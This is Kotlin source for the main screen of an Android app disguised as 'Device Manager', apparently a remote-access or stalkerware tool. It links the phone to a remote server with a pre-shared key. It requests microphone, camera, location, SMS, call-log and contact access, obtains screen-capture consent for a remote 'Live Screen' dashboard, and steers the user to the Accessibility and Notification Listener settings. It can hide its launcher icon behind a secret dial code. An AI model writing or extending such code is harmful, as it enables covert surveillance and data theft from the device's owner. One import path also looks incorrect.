package com.example.admin

import android.Manifest
import android.app.Activity
import android.app.media.MediaProjectionManager
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Color
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.EditText
import android.widget.LinearLayout
import android.widget.ScrollView
import android.widget.TextView
import androidx.core.content.ContextCompat

class MainActivity : Activity() {

    private lateinit var status: TextView

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        val scroll = ScrollView(this)
        val ll = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(dp(16), dp(16), dp(16), dp(16))
            setBackgroundColor(Color.parseColor("#0a0d0a"))
        }
        scroll.addView(ll)
        setContentView(scroll)

        ll.addView(TextView(this).apply {
            text = "Device Manager"
            textSize = 24f
            setTextColor(Color.parseColor("#b9ffb9"))
            setPadding(0, 0, 0, dp(16))
        })

        val serverEt = EditText(this).apply {
            hint = "https://your-app.onrender.com"
            setText(Prefs.getServer(this@MainActivity))
            setTextColor(Color.parseColor("#b9ffb9"))
        }
        ll.addView(serverEt)

        val pskEt = EditText(this).apply {
            hint = "PSK"
            setText(Prefs.getPsk(this@MainActivity))
            setTextColor(Color.parseColor("#b9ffb9"))
        }
        ll.addView(pskEt)

        ll.addView(btn("Save") {
            Prefs.setServer(this@MainActivity, serverEt.text.toString().trim())
            Prefs.setPsk(this@MainActivity, pskEt.text.toString().trim())
            status.text = "Saved."
        })

        ll.addView(btn("Grant permissions") { requestPerms() })

        ll.addView(btn("Start connection") {
            if (Prefs.getServer(this@MainActivity).isBlank() || Prefs.getPsk(this@MainActivity).isBlank()) {
                status.text = "Set URL and PSK first."
                return@btn
            }
            ContextCompat.startForegroundService(
                this@MainActivity,
                Intent(this@MainActivity, ConnectionService::class.java)
            )
            status.text = "Service starting…"
        })

        ll.addView(btn("Grant screen capture") { requestScreenCapture() })

        ll.addView(btn("Toggle hidden icon") {
            if (StealthManager.isHidden(this@MainActivity)) {
                StealthManager.unhide(this@MainActivity)
                status.text = "Icon shown."
            } else {
                StealthManager.hide(this@MainActivity)
                status.text = "Icon hidden. Dial *#*#1337#*#* to unhide."
            }
        })

        ll.addView(btn("Open Accessibility settings") {
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        })

        ll.addView(btn("Open Notification Listener settings") {
            startActivity(Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"))
        })

        status = TextView(this).apply {
            setTextColor(Color.parseColor("#4a6b4a"))
            text = if (Prefs.isRunning(this@MainActivity)) "Service is running." else "Idle."
        }
        ll.addView(status)
    }

    private fun dp(v: Int): Int = (v * resources.displayMetrics.density).toInt()

    private fun btn(label: String, onClick: () -> Unit): Button =
        Button(this).apply {
            text = label
            setTextColor(Color.parseColor("#00ff7a"))
            setBackgroundColor(Color.parseColor("#142014"))
            setOnClickListener { onClick() }
        }

    private fun requestPerms() {
        val perms = mutableListOf(
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.POST_NOTIFICATIONS,
        )
        if (Build.VERSION.SDK_INT >= 33) {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
        } else {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        
        val missing = perms.filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }
        if (missing.isEmpty()) { status.text = "All permissions already granted."; return }
        requestPermissions(missing.toTypedArray(), 100)
    }

    private fun requestScreenCapture() {
        val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(mpm.createScreenCaptureIntent(), 200)
    }

    @Deprecated("Deprecated in Java")
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 200 && resultCode == RESULT_OK && data != null) {
            val svc = Intent(this, ConnectionService::class.java).apply {
                putExtra(ConnectionService.EXTRA_SCREEN_RESULT, resultCode)
                putExtra(ConnectionService.EXTRA_SCREEN_DATA, data)
            }
            ContextCompat.startForegroundService(this, svc)
            status.text = "Screen capture granted. Start Live Screen from dashboard."
        }
    }
}
